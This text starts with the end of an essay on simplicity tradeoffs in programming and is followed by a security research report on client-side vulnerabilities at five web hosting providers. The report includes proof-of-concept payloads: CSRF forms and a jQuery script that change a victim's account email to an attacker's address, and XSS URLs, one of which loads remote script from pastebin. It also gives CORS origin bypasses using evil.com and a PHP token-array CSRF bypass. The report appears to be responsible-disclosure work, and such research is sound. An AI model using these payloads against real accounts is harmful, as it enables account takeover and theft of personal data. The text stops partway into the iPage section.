&lt;p&gt;On the other hand, Rust’s designers aimed at a different concept of simplicity. They wanted to protect users from the types of memory errors that have led to countless CVEs and bugs in C and C++ programs. They did so by embracing the type-theoretic concept of “affine types,” called “lifetimes” in Rust. They also eliminated the traditional idea of null by making Haskell-like &lt;code&gt;Result&lt;/code&gt; and &lt;code&gt;Option&lt;/code&gt; types core to the language.&lt;/p&gt;
&lt;p&gt;Both of these decisions, in major modern languages, solve certain classes of problems—and both pay a price for their choices. Go’s error handling has become a &lt;a href=&quot;https://pbs.twimg.com/media/DCIF7-2W0AEAv9c.jpg&quot;&gt;meme&lt;/a&gt;, for example. Articles to help with understanding lifetimes in Rust are nearly as ubiquitous as monad tutorials for the aspiring Haskeller, and it turns out that a lot of important data structures are pretty hard to implement when you have to worry about them. Still, you can’t say that either language has failed in its goals—it’s just that each has chosen different tradeoffs.&lt;/p&gt;
&lt;p&gt;In other words: every decision made in order to simplify a program will cost something.&lt;/p&gt;
&lt;h2 id=&quot;down-to-earth&quot;&gt;Down to Earth&lt;/h2&gt;
&lt;p&gt;Most programmers aren’t writing programming languages, so the choice of “what to simplify” may seem esoteric, but it’s not. Consider data serialization. When you first implement a web service, it can seem “simple” to model both deserialization and serialization using the same objects. Then, since you’re implementing something new, you naturally want to keep it &lt;a href=&quot;https://en.wikipedia.org/wiki/Don%27t_repeat_yourself&quot;&gt;DRY&lt;/a&gt;, so you hook up your serialization library to your ORM models.&lt;/p&gt;
&lt;p&gt;Then it turns out that you need to add a field to a table for batch processing and omit that from emitted JSON. Then it turns out that the enormous client that is going to pay your salaries for the next three years &lt;em&gt;really&lt;/em&gt; needs XML output. Then it turns out that the &lt;em&gt;other&lt;/em&gt; client, the one owned by your main investor’s brother, is intrinsically incapable of sending in any input other than DOS-formatted CSVs, for some reason.&lt;/p&gt;
&lt;p&gt;Suddenly, it looks like unifying serialization, deserialization, and persistence involved a few more tradeoffs than it seemed when you were writing &lt;code&gt;class Widget:&lt;/code&gt; in that fresh new git repository, right?&lt;/p&gt;
&lt;h2 id=&quot;the-elusive-universal&quot;&gt;The Elusive Universal&lt;/h2&gt;
&lt;p&gt;If everything is a tradeoff, how do we make any decision about the design of our software at all? It’s tempting to make hard and fast rules. There are plenty of those: “Methods should never have more than five lines of code,” “no line of code should be written without a unit test,” or “all production code is pair programmed.” What this is doing, though, is &lt;em&gt;hiding&lt;/em&gt; the choice from you (or lying about it). It’s not that the choice wasn’t made, it’s that someone else made it, and now wants to convince you that their opinion has no cost.&lt;/p&gt;
&lt;p&gt;Instead of accepting this at face value, instead think about &lt;em&gt;how&lt;/em&gt; to make those choices for yourself. Think about the different ways that code can be simple, and the things to which that particular simplicity is opposed.&lt;/p&gt;
&lt;p&gt;For example, dynamically typed languages like Python (or Ruby, Lisp, etc.) are easy and pleasant to write. They avoid the difficulty of convincing a compiler that you’ve written your code correctly, but they’re harder for a new team member to comprehend: you’re trading fluent writing for more laborious reading.&lt;/p&gt;
&lt;p&gt;Short functions, methods, and classes are quick to read, but must either be built of many lower-level functions or themselves comprise parts of larger compositions in order to accomplish anything. You’re trading away locality in favor of concision.&lt;/p&gt;
&lt;p&gt;Error codes are easier to understand than exceptions or &lt;code&gt;Result&lt;/code&gt; types, but they don’t carry much information. You’re trading ease of comprehension for difficulty of debugging. Exceptions carry a great deal of information but break the sequentiality of the code. Result types can carry information &lt;em&gt;and&lt;/em&gt; preserve sequentiality, but can require a lot of “plumbing” in order to compose and handle different types of errors.&lt;/p&gt;
&lt;p&gt;Each of these examples illustrates choices you need to make. You can reduce the number of things you care about to help with making them: limiting your choice of programming languages to a particular set, committing to use automatic formatters, or standardizing on a DevOps toolchain can all help to reduce the number of decisions that need to be made. In the end, though, it will come down to &lt;em&gt;how should I implement this feature?&lt;/em&gt; and you’ll make better decisions about that if you understand that &lt;em&gt;simplicity is not simple.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;And that you should not trust anyone who claims it is.&lt;/p&gt;

<title>We tested popular web hosting companies and all were easily hacked</title>
<link>https://www.websiteplanet.com/blog/report-popular-hosting-hacked/</link>
<guid isPermaLink="true" >https://www.websiteplanet.com/blog/report-popular-hosting-hacked/</guid>
<description>&lt;p&gt;The goal of this research was to try and see if websites hosted on &lt;strong&gt;Bluehost, Dreamhost, HostGator, OVH, or iPage&lt;/strong&gt; could be compromised with one click client-side vulnerabilities. Unfortunately, we found at least one client-side vulnerability in all the platforms we tested, allowing account takeover when the victim clicks a link or visits a malicious website.&lt;/p&gt;
&lt;p&gt;All the platforms we tested are popular hosting providers with a significant number of users. On Website Planet, our goal is to give our readers the most honest and informative reviews, and security is a major factor. That’s why we hire experienced security researchers from time to time to test the services we review. If we find vulnerabilities, we report them to the vendors so they can make the necessary improvements.&lt;/p&gt;
&lt;p&gt;This research was done by &lt;a href=&quot;https://twitter.com/paulosyibelo?lang=en&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Paulos Yibelo&lt;/a&gt;, an experienced security researcher who previously uncovered issues in various devices and software.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Bluehost – Multiple Account Takeover and Information Leak Vulnerabilities&lt;/strong&gt;&lt;span id=&quot;Bluehost---8211---Multiple-Account-Takeover-and-Information-Leak-Vulnerabilities&quot;/&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;strong&gt;1. Information Leak through CORS Misconfigurations&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Severity&lt;/strong&gt;: High&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Impact&lt;/strong&gt;: This vulnerability allows attackers to steal:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Personally Identifiable Information (PII) such as name, location (city, street, state, country), phone number, zip code, etc.&lt;/li&gt;
&lt;li&gt;Partial Payment Details including expiry month and year of credit card, last 4 digits of credit card, name on credit card, credit card type, and payment method.&lt;/li&gt;
&lt;li&gt;Tokens that that can give access to a user’s hosted WordPress, Mojo, SiteLock and various OAuth-supported endpoints.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;a href=&quot;https://www.websiteplanet.com/web-hosting/bluehost/&quot; target=&quot;_blank&quot;&gt;Bluehost&lt;/a&gt; uses cross-origin-resource-sharing (CORS) to share resources across their domains. CORS is a mechanism for relaxing the Same Origin Policy to enable communication between websites via browsers. It’s widely understood that certain CORS configurations are dangerous, but some implications are easily misunderstood.&lt;/p&gt;
&lt;p&gt;After seeing the API endpoint for Bluehost that allows CORS for specific domains, we started trying to bypass the filters to see which websites should be allowed to access what.&lt;/p&gt;
&lt;p&gt;Websites can enable CORS by sending the following HTTP response header:&lt;/p&gt;
&lt;p&gt;Access-Control-Allow-Origin:&lt;br/&gt;https://my.bluehost.com/&lt;/p&gt;
&lt;p&gt;If the above HTTP response is seen in any website, it tells the browser to allow https://my.bluehost.com to read its contents.&lt;/p&gt;
&lt;p&gt;In Bluehost’s case, we saw a loose regular expression that accepted vague values. For instance, if the browser that sends the request is coming from https://my.bluehost.com.evil.com, Bluehost would allow it by responding with:&lt;/p&gt;
&lt;p&gt;Access-Control-Allow-Origin:&lt;br/&gt;https://my.bluehost.com.evil.com&lt;/p&gt;
&lt;p&gt;As you can see, Bluehost only checked the first strings and didn’t consider what came after Bluehost.com. This means malicious attackers could host a subdomain called my.bluehost.com.EVILWEBSITE.com and Bluehost would allow EVILWEBSITE.com to read its contents.&lt;/p&gt;
&lt;p&gt;Browsing through Bluehost, the API endpoint returns very “juicy” information – from personally identifiable information to technical endpoints that can leak various tokens to takeover a Bluehost hosted account.&lt;/p&gt;
&lt;p&gt;First, by going to /api/users endpoint – an attacker can leak the user_id. Then the attacker can use this user_id to query about that user and their content. The attacker can also leak values like email, first and last name, location of user, and also tokens that can give access to their WordPress, Mojo, SiteLock, and various endpoints.&lt;/p&gt;

&lt;/noscript&gt;&lt;img class=&quot;img-lazy-load size-full wp-image-309740 aligncenter&quot; data-src=&quot;https://dt2sdf0db8zob.cloudfront.net/wp-content/uploads/2018/12/Page-2-Image-1.png&quot; alt=&quot;&quot; width=&quot;2880&quot; height=&quot;954&quot;/&gt;&lt;p&gt;As you can see above, the website request is actually hosted on evilwebsite.com and not Bluehost, but the API Response allows it to read its data in its response.&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;2. Account Takeover because of improper JSON request validation CSRF&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Severity&lt;/strong&gt;: Moderately High&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Impact:&lt;/strong&gt; This vulnerability allows attackers to change the email address of any Bluehost user to the address of their choice, and then reset the password using their new email to gain complete access to the victim’s account when a victim clicks a single link or visits a single website.&lt;/p&gt;
&lt;p&gt;This vulnerability can be exploited because of certain misconfigurations in Bluehost’s handling of requests and validating them.&lt;/p&gt;
&lt;p&gt;When users try to change their personal details, such as name, phone number, address, or email, Bluehost sends the following request:&lt;/p&gt;
&lt;noscript&gt;
&lt;p&gt;&lt;img class=&quot;size-full wp-image-309769 aligncenter&quot; src=&quot;https://dt2sdf0db8zob.cloudfront.net/wp-content/uploads/2018/12/Page-3-Image-2.png&quot; alt=&quot;&quot; width=&quot;2862&quot; height=&quot;1096&quot;/&gt;&lt;/p&gt;
&lt;/noscript&gt;&lt;img class=&quot;img-lazy-load size-full wp-image-309769 aligncenter&quot; data-src=&quot;https://dt2sdf0db8zob.cloudfront.net/wp-content/uploads/2018/12/Page-3-Image-2.png&quot; alt=&quot;&quot; width=&quot;2862&quot; height=&quot;1096&quot;/&gt;&lt;p&gt;If you look carefully, you will notice there is no unique token sent with that request. This means any website can actually send the request to that specific endpoint cross-origin, and change your details.&lt;/p&gt;
&lt;p&gt;Normally, this would not be possible because the request is in JSON, and one would need to leverage Adobe Flash Player to be able to send such requests – but we all know Flash is dead. However, in Bluehost’s case, special tricks and server misconfigurations allow it to work in any browser, without using Flash:&lt;/p&gt;
&lt;p&gt;&lt;kbd&gt;&amp;lt;form id=&quot;xsrf&quot; action=&quot;https://my.bluehost.com/cgi/account_center/api/profile&quot; method=&quot;post&quot; enctype=&quot;text/plain&quot;&amp;gt;&lt;/kbd&gt;&lt;/p&gt;
&lt;p&gt;&lt;kbd&gt;&amp;lt;input name='{&quot;country&quot;:&quot;US&quot;,&quot;phone&quot;:&quot;+1.NEWPHONE&quot;,&quot;street1&quot;:&quot;NEW STREET&quot;,&quot;last_name&quot;:&quot;LastName&quot;,&quot;email&quot;:&quot;NEW@EMAIL.com&quot;,&quot;city&quot;:&quot;N EW&quot;,&quot;postal_code&quot;:&quot;0000&quot;,&quot;province&quot;:&quot;WA&quot;,&quot;first_name&quot;:&quot;FirstName ' value='&quot;,&quot;organization&quot;:null}' type='hidden'&amp;gt; The above HTML code will generate a JSON request similar to the one we need, {&quot;country&quot;:&quot;US&quot;,&quot;phone&quot;:&quot;+1.NEWPHONE&quot;,&quot;street1&quot;:&quot;NEW STREET&quot;,&quot;last_name&quot;:&quot;LastName&quot;,&quot;email&quot;:&quot;NEW@EMAIL.com&quot;,&quot;city&quot;:&quot;N EW&quot;,&quot;postal_code&quot;:&quot;0000&quot;,&quot;province&quot;:&quot;WA&quot;,&quot;first_name&quot;:&quot;FirstName =”, organization&quot;:null}&lt;/kbd&gt;&lt;/p&gt;
&lt;p&gt;Since browsers normally add = (equal sign) at the end of the input name, we can manipulate the JSON to include the equal sign in FirstName, and add the remaining values in the “value” attribute: organization”:null}&lt;/p&gt;
&lt;p&gt;As you can see, the request will be sent with &lt;span&gt;Content-Type: text/plain&lt;/span&gt; and not &lt;span&gt;application/json&lt;/span&gt; – but Bluehost doesn’t mind that, which makes our exploit work cross-origin.&lt;/p&gt;
&lt;p&gt;Normally, Bluehost checks if the referrer domain is bluehost.com – if the request is sent from any other website, Bluehost will reject the request with a 500 response.&lt;/p&gt;
&lt;p&gt;This can easily be bypassed by using Content=”no-referrer” in the meta tag, because if no-referrer is sent, Bluehost will allow the request.&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;3. Man-In-The-Middle Because of Improper Validation of CORS Scheme&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Severity&lt;/strong&gt;: Medium&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Impact:&lt;/strong&gt; This vulnerability allows an attacker inside a victim’s internet network, such as public Wi-Fi or a local network (LAN) to read the contents of the victim’s Bluehost associated traffic as plain text, despite Bluehost using SSL/HTTPS traffic to encrypt its contents.&lt;/p&gt;
&lt;p&gt;This vulnerability is based on issue #1 (CORS Misconfiguration) – but instead of not verifying the domain, in this case, Bluehost doesn’t verify the scheme/protocol when allowing it to read its contents.&lt;/p&gt;
&lt;noscript&gt;
&lt;p&gt;&lt;img class=&quot;size-full wp-image-309798 aligncenter&quot; src=&quot;https://dt2sdf0db8zob.cloudfront.net/wp-content/uploads/2018/12/Page-4-Image-3.png&quot; alt=&quot;&quot; width=&quot;2880&quot; height=&quot;1122&quot;/&gt;&lt;/p&gt;
&lt;/noscript&gt;&lt;img class=&quot;img-lazy-load size-full wp-image-309798 aligncenter&quot; data-src=&quot;https://dt2sdf0db8zob.cloudfront.net/wp-content/uploads/2018/12/Page-4-Image-3.png&quot; alt=&quot;&quot; width=&quot;2880&quot; height=&quot;1122&quot;/&gt;&lt;p&gt;As you can see in the response, Bluehost is granting an HTTP domain, to read its contents. This tells the browser to allow the HTTP domain to access its contents (unencrypted) – this downgrade attack makes the use of SSL Certificate by Bluehost completely useless and defeats the whole purpose of using an HTTPS request in the first place.&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;4. XSS on my.bluehost.com allowing for account takeover&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; Moderately High&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Impact:&lt;/strong&gt; this vulnerability allows an attacker to execute commands as the client on bluehost.com – this means the ability to change, modify, and add content, including the email address. The attacker can read content about the victim, or change the content on their website when the victim clicks on a malicious link or visits a website.&lt;/p&gt;
&lt;noscript&gt;
&lt;p&gt;&lt;img class=&quot;size-full wp-image-309827 aligncenter&quot; src=&quot;https://dt2sdf0db8zob.cloudfront.net/wp-content/uploads/2018/12/Page-5-Image-4.png&quot; alt=&quot;&quot; width=&quot;2856&quot; height=&quot;1576&quot;/&gt;&lt;/p&gt;
&lt;/noscript&gt;&lt;img class=&quot;img-lazy-load size-full wp-image-309827 aligncenter&quot; data-src=&quot;https://dt2sdf0db8zob.cloudfront.net/wp-content/uploads/2018/12/Page-5-Image-4.png&quot; alt=&quot;&quot; width=&quot;2856&quot; height=&quot;1576&quot;/&gt;&lt;p&gt;Two low-impact issues make this vulnerability incredibly dangerous. The first one is that Bluehost does not require a current password when changing one’s email address. This means one can simply change the email address and reset the password by using XSS.&lt;/p&gt;
&lt;p&gt;The second one is Bluehost not having set any HttpOnly flags on their sensitive cookies. This means any JavaScript can access them and send them to a malicious attacker, and the attacker can use these cookies to authenticate as the user.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PoC&lt;/strong&gt;: https://my.bluehost.com/cgi/dm/subdomain/redirect?domainkey=”&amp;gt;&amp;lt;script&amp;gt;alert(document.d omain)&amp;lt;/script&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Check out the video here:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;iframe src=&quot;https://www.youtube.com/embed/lOiqnP1hLfk?rel=0&quot; width=&quot;100%&quot; height=&quot;360&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;allowfullscreen&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/p&gt;
&lt;h2&gt;Dreamhost XSS and Information Disclosure Vulnerabilities&lt;span id=&quot;Dreamhost-XSS-and-Information-Disclosure-Vulnerabilities&quot;/&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;strong&gt;1. Account Takeover via XSS&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Severity&lt;/strong&gt;: Moderately High&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Impact&lt;/strong&gt;: This vulnerability allows an attacker to easily change the victim’s email or password to whatever they desire when the victim visits a link or a malicious website.&lt;/p&gt;
&lt;p&gt;The payload:&lt;/p&gt;
&lt;p&gt;https://panel.dreamhost.com/tree=domain.manage&amp;amp;current_step=Index&amp;amp;next_step=ShowAddhttp&amp;amp;domain=:lol”&amp;gt;&amp;lt;svg/onload=alert() will generate an alert on panel.dreamhost.com (profile and website management)&lt;/p&gt;
&lt;p&gt;This can be extended to an account takeover because &lt;a href=&quot;https://www.websiteplanet.com/web-hosting/dreamhost/&quot; target=&quot;_blank&quot;&gt;DreamHost&lt;/a&gt; doesn’t ask for a password in order to change your email address, so an attacker can simply perform CSRF attack using this XSS vulnerability to take over any account.&lt;br/&gt;&lt;kbd&gt;&lt;br/&gt;$.ajax({&lt;br/&gt;url: &quot;https://panel.dreamhost.com/id/?tab=contact&amp;amp;command=edit&quot;,&lt;br/&gt;method: &quot;POST&quot;,&lt;br/&gt;dataType: &quot;html&quot;,&lt;br/&gt;success: function(response)&lt;br/&gt;{&lt;br/&gt;var security_cookie =&lt;br/&gt;$(response).find(&quot;input[name='security_cookie']&quot;).val();&lt;br/&gt;$.post( &quot;https://panel.dreamhost.com/id/?&quot;, { tab: &quot;contact&quot;,&lt;br/&gt;command: &quot;submit_edit&quot;, security_cookie :security_cookie, prefix : &quot;&quot;, first&lt;br/&gt;: &quot;Santa&quot;, middle : &quot;&quot;, last : &quot;Bluh&quot;, suffix : &quot;&quot;, street1 : &quot;Nurit 103&quot;,&lt;br/&gt;street2 : &quot;&quot;, city : &quot;Ora&quot;, state : &quot;jerusalem&quot; , zip : &quot;90880&quot; , country :&lt;br/&gt;&quot;IL&quot; , email : &quot;attacker@gmail.com&quot;,phone:&quot;+954.8888777&quot;,fax: &quot;&quot;, chat :&quot;&quot;,&lt;br/&gt;twitter:&quot;&quot;,url:&quot;&quot;}).done(function( data ) {&lt;br/&gt;console.log( data );&lt;br/&gt;});&lt;br/&gt;console.log(security_cookie);&lt;br/&gt;},&lt;br/&gt;error: function(error)&lt;br/&gt;{&lt;br/&gt;console.log($error);&lt;br/&gt;}&lt;br/&gt;});&lt;br/&gt;&lt;/kbd&gt;&lt;/p&gt;
&lt;p&gt;The above JavaScript, when executed by panel.dreamhost.com, changes the logged in email address to attacker@gmail.com – this can be done with our XSS vulnerability.&lt;/p&gt;
&lt;p&gt;https://panel.dreamhost.com/tree=domain.manage¤t_step=Index&amp;amp;next_step=ShowAddhttp&amp;amp;domain=:lol%22%3E%0A%3Cscript%20async%20src=%22//pastebin.com/raw/65CayjA7%22%3E%3C/script%3E%0A%3Cscript%3E%20var%20x%20=%20%22/*&lt;/p&gt;
&lt;p&gt;When a victim visits the above link in anyway, they will change their email address to the attackers.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Check out the video here:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;iframe src=&quot;https://www.youtube.com/embed/BJb2T3E6ZC0?rel=0&quot; width=&quot;100%&quot; height=&quot;360&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;allowfullscreen&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/p&gt;
&lt;h2&gt;HostGator Information Disclosure and Multiple Vulnerabilities&lt;span id=&quot;HostGator-Information-Disclosure-and-Multiple-Vulnerabilities&quot;/&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;strong&gt;1. Sitewide CSRF Protection Bypass allowing complete control&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; High&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Impact:&lt;/strong&gt; This vulnerability exists all around the user’s account section of the website. An attacker can add, edit, or change any value in the victim’s profile, including the email address and personal information, when a victim clicks on a link or visits a malicious website.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.websiteplanet.com/web-hosting/hostgator/&quot; target=&quot;_blank&quot;&gt;HostGator&lt;/a&gt; normally uses anti-CSRF tokens with any form submits. However, the server can be tricked to ignore anti-CSRF tokens by changing the POST parameter token to token[]= and leaving it empty – this lets the CSRF check pass as true. I suspect this might be a Type Juggling vulnerability, with a pseudo code sample:&lt;/p&gt;
&lt;p&gt;&lt;kbd&gt;if (strcasecmp($_GET['token'],&quot;$csrf_token&quot;) == 0) {&lt;/kbd&gt;&lt;/p&gt;
&lt;p&gt;The above function might look sufficient for most programmers, especially if they migrated from C/C++ to web development. While the function looks as if it would only evaluate true if the strings are the same, it is also the case that if an array is given into the variable, then a NULL response is given back. According to PHP’s comparison, for instance, NULL is actually 0. So, it will pass as valid!&lt;/p&gt;
&lt;p&gt;&lt;kbd&gt;data=changeaction&amp;amp;token[]=&lt;/kbd&gt;&lt;/p&gt;
&lt;p&gt;The second anti-CSRF token they have is a referrer-based check. They check if the request came from http://portal.hostgator.com/anything? – but this can easily be bypassed by using an open redirect on the website, which is common in such places.&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;2. Multiple CORS Misconfigurations leading to Information Leak and CRLF&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;A. Information Leak&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Severity&lt;/strong&gt;: Moderately High&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Impact&lt;/strong&gt;: This vulnerability lets attackers read API responses coming from HostGator because of a CORS misconfiguration. The API response responds with full customer and domain details.&lt;/p&gt;
&lt;noscript&gt;
&lt;p&gt;&lt;img class=&quot;size-full wp-image-337040 aligncenter&quot; src=&quot;https://dt2sdf0db8zob.cloudfront.net/wp-content/uploads/2019/01/image1-1.jpg&quot; alt=&quot;&quot; width=&quot;1430&quot; height=&quot;332&quot;/&gt;&lt;/p&gt;
&lt;/noscript&gt;&lt;img class=&quot;img-lazy-load size-full wp-image-337040 aligncenter&quot; data-src=&quot;https://dt2sdf0db8zob.cloudfront.net/wp-content/uploads/2019/01/image1-1.jpg&quot; alt=&quot;&quot; width=&quot;1430&quot; height=&quot;332&quot;/&gt;&lt;p&gt;As you can see in the Access-Control-Allow-Origin response from HostGator, it is allowing evil.com (example domain name) to access the response contents.&lt;/p&gt;
&lt;p&gt;This is due to HostGator’s weak regular expression check to match what domains are allowed to read its response. It allows any website that ends with .hostgator.com pass – this meant sending payloads like: http://evil.com/?null=portal.hostgator.com and evil.com\@.hostgator.com. The fact that any character is allowed before .hostgator.com creates all sorts of issues.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. CRLF Injection in Microsoft Edge and Internet Explorer&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Severity&lt;/strong&gt;: Moderate&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Impact&lt;/strong&gt;: This vulnerability only affects HostGator users that use Microsoft Edge and Internet Explorer. It allows attackers to inject new headers and possibly execute client-side scripts.&lt;/p&gt;
&lt;p&gt;The very fact that any character sent is responded back in the CORS header response without any encoding or even checking it for illegal characters like \r, means that we have an HTTP header injection vulnerability against IE/Edge users as Internet Explorer and Edge view \r (0x0d) as a valid HTTP header terminator:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. Man-In-The-Middle Because of Improper Validation of CORS Scheme&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Severity&lt;/strong&gt;: Medium&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Impact&lt;/strong&gt;: This vulnerability allows an attacker inside a victim’s internet traffic, such as public Wi-Fi or a local network (LAN), to read the contents of the victim’s HostGator API associated traffic as plain text, despite HostGator using proper SSL/HTTPS traffic to encrypt its contents.&lt;/p&gt;
&lt;p&gt;As seen in the #1A screenshot – anything is accepted in the Access-Control-Allow-Origin if it ends with .hostgator.com. This also means any protocol or scheme, as you can see in the screenshot above – http://anything.hostgator.com allows a local attacker to read HTTPS response by using CORS. This vulnerability not only means that any XSS or a similar vulnerability hosted on any HostGator subdomain worked, but any local-network attacker being able to read CORS responses.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Check out the video here:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;iframe src=&quot;https://www.youtube.com/embed/qZlgdpUGzZ4?rel=0&quot; width=&quot;100%&quot; height=&quot;360&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;allowfullscreen&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/p&gt;
&lt;h2&gt;OVH Information Disclosure and Multiple Vulnerabilities&lt;span id=&quot;OVH-Information-Disclosure-and-Multiple-Vulnerabilities&quot;/&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;strong&gt;1. CSRF protection Bypass&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Severity&lt;/strong&gt;&lt;span&gt;: High&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Impact&lt;/strong&gt;&lt;span&gt;: This vulnerability exists all around the website. An attacker can add, edit, or change any value in the victim’s profile, including email address and personal information, when an authenticated victim clicks on a link or visits a malicious website.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;OVH implanted two types of anti-CSRF defenses. One is checking the request’s Content-Type is&lt;/span&gt; &lt;em&gt;&lt;span&gt;application/json&lt;/span&gt;&lt;/em&gt; &lt;span&gt;and the second is making sure if the referrer website is “ovh.com”. Let’s break it down on why that wasn’t enough.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;While those two can’t normally be forged by other websites, we found simple bypasses that worked for OVH in either of the cases.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;xhr.setRequestHeader(‘Content-Type’,’text/plain; application/json’);&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Browsers will refuse to send &lt;/span&gt;&lt;em&gt;&lt;span&gt;application/json&lt;/span&gt;&lt;/em&gt;&lt;span&gt; as a &lt;/span&gt;&lt;em&gt;&lt;span&gt;Content-Type&lt;/span&gt;&lt;/em&gt;&lt;span&gt;, however by sending ‘&lt;/span&gt;&lt;em&gt;&lt;span&gt;text/plain; application/json&lt;/span&gt;&lt;/em&gt;&lt;span&gt;’– the request will be allowed to pass, it seems the server was only checking if &lt;/span&gt;&lt;em&gt;&lt;span&gt;application/json&lt;/span&gt;&lt;/em&gt;&lt;span&gt; is contained with the Content-Type header.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;The second protection is referrer check, normally referrer checks are widely misunderstood and easily bypassable countermeasures.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;In OVH’s case: while the server checked the request came from “ovh.com” – it didn’t care about the scheme – both HTTP and HTTPS versions of “ovh.com” were accepted as valid referrers. In any sort of MITM case, one can spoof DNS of&lt;/span&gt; &lt;span&gt;http://ovh.com&lt;/span&gt; &lt;span&gt;(HTTP, attacker injected content) – when victim browses, will redirect them to&lt;/span&gt; &lt;span&gt;https://ovh.com&lt;/span&gt; &lt;span&gt;(HTTPS) with CSRF payload, this effectively spoofs the referrer check as both HTTP and HTTPS schemes are allowed here. (This is due to the fact how OVH doesn’t enforce HSTS, but can be easily mitigated by doing that)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Referrer-based CSRF protections are generally useless though for one not so widely known fact, browsers. Many major browsers have security bugs they consider&lt;/span&gt; &lt;em&gt;&lt;span&gt;LOW&lt;/span&gt;&lt;/em&gt; &lt;span&gt;priority to&lt;/span&gt; &lt;em&gt;&lt;span&gt;WONTFIX&lt;/span&gt;&lt;/em&gt; &lt;span&gt;that lets websites spoof their referrers. In case of Microsoft Edge, for example, Manuel Caballero found a&lt;/span&gt; &lt;a href=&quot;https://www.cracking.com.ar/demos/referer/02/&quot;&gt;&lt;span&gt;nice referrer spoof&lt;/span&gt;&lt;/a&gt; &lt;span&gt;bug that still isn’t fixed in the browser (and likely not anytime soon) – websites relaying and trusting on browsers sending them user-controllable data causes a serious problem.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;To summarize:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;– Thanks to the way Google Mail works, an email sent to myemail+2=@gmail.com will actually go to myemail@gmail.com — so by sending:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;{“newEmail”:”myemail+2=@gmail.com”}&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;with&lt;/span&gt; &lt;span&gt;‘text/plain; application/json’ Content-Type&lt;/span&gt; &lt;span&gt;header&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;one can change email just with HTML forms. The referrer can be spoofed using browser bugs, or with MITM.&lt;/span&gt;&lt;/p&gt;

&lt;h2&gt;&lt;strong&gt;iPage Account Takeover and Multiple Vulnerabilities&lt;/strong&gt;&lt;span id=&quot;iPage-Account-Takeover-and-Multiple-Vulnerabilities&quot;/&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;strong&gt;1. Account Takeover&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Severity&lt;/strong&gt;: High&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Impact:&lt;/strong&gt; This vulnerability allows an attacker to remotely take over any iPage account, when the victim simply clicks a link or visits a website.&lt;/p&gt;
